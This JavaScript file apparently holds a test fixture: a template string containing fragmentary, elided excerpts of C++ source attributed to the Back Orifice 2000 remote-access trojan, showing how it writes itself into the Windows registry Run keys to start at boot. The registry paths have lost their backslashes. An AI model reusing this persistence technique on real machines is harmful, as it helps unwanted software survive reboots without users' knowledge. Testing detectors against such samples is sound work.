// https://github.com/JeremyNGalloway/BO2K/blob/master/bo2k/BO2K/src/main.cpp
const test = `
...
{	
	...
	if(g_bIsWinNT) {
		svRunRegKey="SOFTWAREMicrosoftWindowsCurrentVersionRun";
	} else {
		svRunRegKey="SoftwareMicrosoftWindowsCurrentVersionRunServices";
	}
	HKEY key;
	...
	if(g_bIsWinNT) {
		...
		RegOpenKey(HKEY_CURRENT_USER,"SoftwareMicrosoftWindowsCurrentVersionRun",&key);
		RegDeleteValue(key,svTarget);
		RegCloseKey(key);
...
{	
	...
	if(bRunAtStartup) {
		...
		if(nInstall==1 && g_bIsWinNT) {
			HKEY key;
			if(RegCreateKey(HKEY_CURRENT_USER,"SoftwareMicrosoftWindowsCurrentVersionRun",&key)==ERROR_SUCCESS) {
				DWORD len=512;
				char svRegPath[512];
		...
		if((nInstall>0) && (nInstall<2) && g_bIsWinNT) {
			HKEY key;
			if(RegOpenKey(HKEY_CURRENT_USER,"SoftwareMicrosoftWindowsCurrentVersionRun",&key)==ERROR_SUCCESS) {
				if(RegSetValueEx(key,svTarget,0,REG_SZ,(BYTE *)svTargetName,lstrlen(svTargetName))==ERROR_SUCCESS) {
					nInstall=2;
				}
				RegCloseKey(key);
